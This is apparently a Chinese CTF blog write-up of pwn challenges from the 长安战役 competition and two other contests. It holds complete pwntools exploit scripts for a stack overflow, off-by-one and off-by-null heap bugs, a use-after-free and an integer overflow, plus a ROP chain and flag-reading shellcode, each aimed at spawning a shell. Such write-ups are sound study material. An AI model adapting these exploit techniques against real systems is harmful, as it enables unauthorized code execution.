---
title: 长安战役 PWN
date: 2022-01-09 21:26:54
tags:
    - stack overflow
    - off by one
    - off by null
    - switch表修复
    - 栈迁移
    - 汇编
---

> 大体说下，pwn1拿了一血，pwn2拿了第四，pwn3拿了二血。前些日子的抑郁，一直没勇气再做pwn题，等到恢复好了就直接搞kernel去了，这次比赛只是为了试验下自己。

### pwn1

* 是2.23的stack overflow，但是sp指针的切换方式不太一样

```C
.text:0804859E                 mov     ecx, [ebp+var_4]
.text:080485A1                 leave
.text:080485A2                 lea     esp, [ecx-4]
.text:080485A5                 retn
.text:080485A5 ; } // starts at 8048559

/*
leave :
mov esp,ebp
pop ebp
栈迁移有时用到它

ret :
pop rip
*/

```
* 实际没必要研究具体的切换方式，使用padding溢出，看最终esp和padding中字符串有啥关系，再相应调整padding。

```c
#!/usr/bin/env python
from pwn import *

local = 0
debug = 1
binary = "./pwn1"
lib = "/lib/i386-linux-gnu/libc.so.6"
elf = ELF(binary)
context.log_level = "debug" if debug else "info"

if local:
    p = process(binary)
    libc = ELF(lib)
else :
    p = remote("113.201.14.253",16088)
    # lib = "./libc.so.6"
    # libc = ELF(lib)

s      = lambda buf        : p.send(buf)
sl     = lambda buf        : p.sendline(buf)
sa     = lambda delim, buf : p.sendafter(delim, buf)
sal    = lambda delim, buf : p.sendlineafter(delim, buf)
sh     = lambda            : p.interactive()
r      = lambda n=None     : p.recv(n)
ru     = lambda delim      : p.recvuntil(delim)
r7f    = lambda            : u64(p.recvuntil("\x7f")[-6:]+"\x00\x00")
trs    = lambda addr       : libc.address+addr
gadget = lambda ins        : libc.search(asm(ins,arch="amd64")).next()
tohex  = lambda buf        : "".join("\\x%02x"%ord(_) for _ in buf)


ru("Gift:")
buf = int(ru("\n"),16)
payload = ""
payload += p32(0x8048540)
payload += "BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMM"
payload += p64(buf+4)
raw_input()
sl(payload)
# 08048540
sh()
```

### pwn2

* off by one，没啥可说。

* exp

```python
#!/usr/bin/env python
from pwn import *

local = 0
debug = 1
binary = "./pwn2"
lib = "/lib/x86_64-linux-gnu/libc.so.6"
elf = ELF(binary)
context.log_level = "debug" if debug else "info"

if local:
    p = process(binary)
    libc = ELF(lib)
else :

    p = remote("113.201.14.253",16066)
    lib = "./libc-2.27.so"
    libc = ELF(lib)

s      = lambda buf        : p.send(buf)
sl     = lambda buf        : p.sendline(buf)
sa     = lambda delim, buf : p.sendafter(delim, buf)
sal    = lambda delim, buf : p.sendlineafter(delim, buf)
sh     = lambda            : p.interactive()
r      = lambda n=None     : p.recv(n)
ru     = lambda delim      : p.recvuntil(delim)
r7f    = lambda            : u64(p.recvuntil("\x7f")[-6:]+"\x00\x00")
trs    = lambda addr       : libc.address+addr
gadget = lambda ins        : libc.search(asm(ins,arch="amd64")).next()
tohex  = lambda buf        : "".join("\\x%02x"%ord(_) for _ in buf)

def add(size,content):
	sal("Choice: ","1")
	sal("size: ",str(size))
	sal("content: ",content)
def free(id):
	sal("Choice: ","3")
	sal("idx: ",str(id))
def edit(id,content):
	sal("Choice: ","2")
	sal("idx: ",str(id))
	sa("content: ",content)
def show(id):
	sal("Choice: ","4")
	sal("idx: ",str(id))

for _ in range(8):
	add(0x88,"A"*8)
add(0x28,"B"*8)
for _ in range(8):
	free(7-_)
add(0x18,"C"*7)
edit(0,"C"*8)
show(0)
libc.address = r7f()-224-0x10 - libc.sym["__malloc_hook"]
info("[+] libc base => 0x%x"%libc.address)
add(0x68,"aaaa")
add(0x18,"D"*8)
add(0x18,"E"*8)
add(0x18,"F"*8)
add(0x18,"G"*8)
free(2)
add(0x18,"A"*0x18+"\x41")
free(3)
free(5)
free(4)
add(0x38,"PPPPPP")
payload = "A"*0x18
payload += p64(0x21)
payload += p64(libc.sym["__free_hook"]-8)
payload += p64(0)
edit(3,payload)
add(0x18,"AAAAA")
add(0x18,"/bin/sh\x00"+p64(libc.sym["system"]))
free(5)
sh()
```

### pwn3

* 算是off by null
* 漏洞点在strncat，拼接之后会以\x00终结字符串
* 在轩轩师傅的blog中找到一篇总结截断属性的blog，放在ref1了。

```Bash
$ man strncat
DESCRIPTION
       The strcat() function appends the src string to the dest string, overwriting the terminating null byte ('\0') at the end of
       dest, and then adds a terminating null byte.  The strings may not overlap, and the dest string must have enough  space  for
       the  result.   If  dest  is  not large enough, program behavior is unpredictable; buffer overruns are a favorite avenue for
       attacking secure programs.
NOTES
       This  function appends the null-terminated string src to the string dest, copying at most size-strlen(dest)-1 from src, and
       adds a terminating null byte to the result, unless size is less than strlen(dest).  
```

* exp

```python
#!/usr/bin/env python
from pwn import *

p = remote("113.201.14.253","16033")
elf = ELF("./Gpwn3")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


p.sendlineafter("You choice:","1")
p.sendafter("Give me a character level :","A"*(0x24-1)+"\x00")

p.sendlineafter("You choice:","2")
p.sendafter("Give me another level :","A")

p.sendlineafter("You choice:","2")
p.sendafter("Give me another level :","\xff"*8)

p.sendlineafter("You choice:","3")
p.recvuntil("Here's your reward: ")
puts = int(p.recvuntil("\n"),16)
libc.address = puts - libc.sym["puts"]

p.sendafter(":",p64(libc.address+0x5f0040+3848))
p.sendafter("you!",p64(libc.address+0xf1247))

p.interactive()
```

* 模拟

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>


#define SIZE (0x20)

typedef struct
{
	char buf[SIZE];
	int len;
}item;

int main()
{
	item *p;
	p = malloc(sizeof(item));
	memset(p,0x00,sizeof(item));
	
	memset(p->buf,0x41,0x15);
	p->len = strlen(p->buf);
	strncat(p->buf,"BBBBBBBBBBBBBBBBBBBBBBBB",SIZE - p->len);

	assert(p->len == 0);
	return 0;
}
```

### pwn4 

* 是个c++的pwn，c++的内存管理一直在我的stack里压着呢，只能莽。
* 比赛时逆向修复switch修复是add修复不了，人工逆向c++没那勇气。
![](https://files.catbox.moe/iw98jz.jpg)
* 后来才知道是因为出题人忘了加break了，switch表只能部分修复，赛后做了下很明显的uaf，就是堆有点难控制，搞得有点玄学。

* exp

```python
#!/usr/bin/env python2
from pwn import *

local = 1
debug = 1
binary = "./pwn4"
# lib = "/lib/x86_64-linux-gnu/libc.so.6"
lib = "./libc-2.31.so"
elf = ELF(binary)
context.log_level = "debug" if debug else "info"

if local:
    p = process(binary)
    libc = ELF(lib)
else :
    p = remote()
    lib = "./libc.so.6"
    libc = ELF(lib)

s      = lambda buf        : p.send(buf)
sl     = lambda buf        : p.sendline(buf)
sa     = lambda delim, buf : p.sendafter(delim, buf)
sal    = lambda delim, buf : p.sendlineafter(delim, buf)
sh     = lambda            : p.interactive()
r      = lambda n=None     : p.recv(n)
ru     = lambda delim      : p.recvuntil(delim)
r7f    = lambda            : u64(p.recvuntil("\x7f")[-6:]+"\x00\x00")
trs    = lambda addr       : libc.address+addr
gadget = lambda ins        : libc.search(asm(ins,arch="amd64")).next()
tohex  = lambda buf        : "".join("\\x%02x"%ord(_) for _ in buf)

def add(id,key):
    sal("Your choice: ","1")
    sal("Your index: ",str(id))
    sal("Enter your name: ","Cat03")
    sal("Please input a key: ",key)
    sal("Please input a value: ",str(0x123456))

def free(id):
    sal("Your choice: ","4")
    sal("Your index: ",str(id))

def show(id):
    sal("Your choice: ","2")
    sal("Your index: ",str(id))

def edit(id,content):
    sal("Your choice: ","3")
    sal("Your index: ",str(id))
    sal("Enter your name: ","Cat03")
    sal("New key length: ","6")
    sal("Key: ",content)
    sal("Value: ",str(0x123456))


for _ in range(8):
    add(_,"A"*0x91)
for _ in range(6):
    free(_)
free(7)
show(7)
libc.address = r7f() - 96 - 0x10 - libc.sym["__malloc_hook"]

add(0,"A"*0x28)
add(1,"A"*0x28)
add(2,"A"*0x28)
add(3,"/bin/sh\x00")
free(0)
free(1)
free(2)

edit(2,p64(libc.sym["__free_hook"])[:6])
free(0)
info("libc base => 0x%x"%libc.address)
raw_input()
payload = p64(libc.sym["system"])
add(0,payload.ljust(0x28,"A"))
free(3)
sh()
```


-----
下面是其他的题，不记得哪个比赛了

### array_list

* struct

|FMT||
|---|---|
|<|big(default)|
|>|little|
|i|int|
|I|unsigned int|
|c|char|
|q|int64|
|Q|uint64|
|f|float|
|d|double|

```python
#!/usr/bin/env python
#_*_coding:utf-8_*_

from pwn import *
import struct

local = 1
debug = 1
binary = "./array_list"
lib = "/lib/x86_64-linux-gnu/libc.so.6"
elf = ELF(binary)
context.log_level = "debug" if debug else "info"

if local:
    p = process(binary)
    libc = ELF(lib)
else :
    p = remote("xaut.team","4002")
    # lib = "./libc.so.6"
    libc = ELF(lib)

s      = lambda buf        : p.send(buf)
sl     = lambda buf        : p.sendline(buf)
sa     = lambda delim, buf : p.sendafter(delim, buf)
sal    = lambda delim, buf : p.sendlineafter(delim, buf)
sh     = lambda            : p.interactive()
r      = lambda n=None     : p.recv(n)
ru     = lambda delim      : p.recvuntil(delim)
r7f    = lambda            : u64(p.recvuntil("\x7f")[-6:]+"\x00\x00")
trs    = lambda addr       : libc.address+addr
gadget = lambda ins        : libc.search(asm(ins,arch="amd64")).next()
tohex  = lambda buf        : "".join("\\x%02x"%ord(_) for _ in buf)

def swap():
	sal("swap count: ","1")
	sal("x: ","0")
	sal("y: ","30")

def make_array(len,array):
	sal("array count: ",str(len))
	for _ in range(len):
		sal("array[%d] = "%_ ,str(array[_]))

make_array(1,(0,))
swap()
ru("array[0] = ")
base = int(ru("\n"))
base = struct.pack("i",base)
base = struct.unpack("I",base)[0]
libc.address = base-240-libc.sym["__libc_start_main"]

og = (0x45226,0x4527a,0xf03a4,0xf1247)
ogg = og[0]+libc.address

info("ogg => 0x%x"%ogg)
make_array(1,(ogg,))
swap()
sal("array count: ","21")

sh()


'''
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
```


### baba_povit

* buff很短可以考虑栈迁移

溢出之后只能执行一段gadget，之后利用

```python
.text:00000000004009B9                 sub     rsp, 300h
.text:00000000004009C0                 retn
```
降低rsp，就能把前边的padding当作ROP了。

```python
#!/usr/bin/env python
#_*_coding:utf-8_*_

from pwn import *

local = 1
debug = 1
binary = "./baby_povit"
lib = "/lib/x86_64-linux-gnu/libc.so.6"
elf = ELF(binary)
context.log_level = "debug" if debug else "info"

if local:
    p = process(binary)
    libc = ELF(lib)
else :
    # p = remote("xaut.team","4002")
    # lib = "./libc.so.6"
    libc = ELF(lib)

s      = lambda buf        : p.send(buf)
sl     = lambda buf        : p.sendline(buf)
sa     = lambda delim, buf : p.sendafter(delim, buf)
sal    = lambda delim, buf : p.sendlineafter(delim, buf)
sh     = lambda            : p.interactive()
r      = lambda n=None     : p.recv(n)
ru     = lambda delim      : p.recvuntil(delim)
r7f    = lambda            : u64(p.recvuntil("\x7f")[-6:]+"\x00\x00")
trs    = lambda addr       : libc.address+addr
gadget = lambda ins        : elf.search(asm(ins,arch="amd64")).next()
tohex  = lambda buf        : "".join("\\x%02x"%ord(_) for _ in buf)

# 0x000000000047c631 : mov qword ptr [rsi], rax ; ret
# 0x0000000000401756 : pop rdi ; ret
# 0x0000000000401877 : pop rsi ; ret
# 0x0000000000442d06 : pop rdx ; ret
# 0x000000000041f854 : pop rax ; ret

sal("input your num:","4294967216\n0\n0")

payload = "A"*0x10
rop  = p64(0x000000000041f854) # pop rax
rop += p64(0x0068732f6e69622f) # /bin/sh\x00
rop += p64(0x0000000000401877) # pop rsi
rop += p64(0x6c9000)		   # bss
rop += p64(0x000000000047c631) # mov qword ptr [rsi], rax ; ret
rop += p64(0x0000000000401756) # pop rdi
rop += p64(0x6c9000)
rop += p64(0x0000000000401877) # pop rsi
rop += p64(0)
rop += p64(0x0000000000442d06) # pop rdx
rop += p64(0)
rop += p64(0x000000000041f854) # pop rax
rop += p64(0x3b)
rop += p64(0x46F7B5)           # syscall
payload += rop 
payload += "A"*(0x300-0x10-len(rop))
payload += p64(0)
payload += p64(0x4009b9)
raw_input()

sal("give your data:",payload)
sh()

```

### openat

```
;;nasm -f elf64 test.asm 
;;ld -m elf_x86_64 -o test test.o

section .data
	flag db "/flag",0x00
	len equ $-flag

section .test
	global _start

_start:
	
	;syscall(openat,int dfd,const char *filename,int flags,	umode_t mode)
	xor rdi,rdi
	mov rsi,flag
	mov rdx,0
	mov r10,0
	mov rax,0x101
	syscall

	;syscall(read,unsigned int fd,char *buf,size_t count)
	mov rdi,rax
	mov rsi,rsp
	mov rdx,0x40
	xor rax,rax
	syscall

	;syscall(write,unsigned int fd,const char *buf,size_t count)
	mov rdi,1
	mov rax,1
	syscall
```

### Reference

* [CTF中常见的C语言输入函数截断属性总结](https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/16/input/)